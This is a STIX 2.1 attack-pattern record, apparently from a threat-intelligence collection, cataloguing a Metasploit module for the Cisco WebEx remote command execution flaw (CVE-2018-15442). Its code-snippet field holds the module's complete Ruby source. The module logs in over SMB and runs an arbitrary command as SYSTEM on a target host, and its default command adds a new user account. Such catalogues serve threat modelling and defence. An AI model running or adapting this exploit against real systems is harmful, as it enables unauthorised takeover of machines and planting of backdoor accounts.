{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--047b588f-f1ad-4312-8d7a-4048aacdd100",
    "created": "2024-08-14T16:24:20.883807Z",
    "modified": "2024-08-14T16:24:20.883811Z",
    "name": "WebEx Remote Command Execution Utility",
    "description": " This module enables the execution of a single command as System by exploiting a remote code execution vulnerability in Cisco's WebEx client software.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/webexec_command.rb",
            "external_id": "webexec_command.rb"
        },
        {
            "source_name": "reference",
            "url": "https://webexec.org"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15442"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client::WebExec\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::SimpleClient\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WebEx Remote Command Execution Utility',\n      'Description'    => %q{\n        This module enables the execution of a single command as System by exploiting a remote\n        code execution vulnerability in Cisco's WebEx client software.\n      },\n\n      'Author'         => [\n        'Ron Bowes <ron@skullsecurity.net>',\n      ],\n\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        ['URL', 'https://webexec.org'],\n        ['CVE', '2018-15442']\n      ]\n    ))\n\n    register_options([\n      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net user testuser testpass /add']),\n      OptPort.new('RPORT', [true, 'The Target port', 445]),\n      OptBool.new('FORCE_GUI', [true, 'Ensure a GUI is created via wmic', false]),\n    ])\n  end\n\n  # This is the main control method\n  def run_host(ip)\n    @smbshare = datastore['SMBSHARE']\n    @ip = ip\n\n    # Try and authenticate with given credentials\n    if connect\n      begin\n        smb_login\n      rescue Rex::Proto::SMB::Exceptions::Error => autherror\n        print_error(\"Unable to authenticate with given credentials: #{autherror}\")\n        return\n      end\n\n      command = datastore['COMMAND']\n      if datastore['FORCE_GUI']\n        command = \"WMIC PROCESS CALL Create \\\"#{command}\\\"\"\n      end\n\n      wexec(true) do |opts|\n        execute_single_command(command, opts)\n      end\n\n      print_good(\"Command completed!\")\n      disconnect\n    end\n  end\nend\n"
}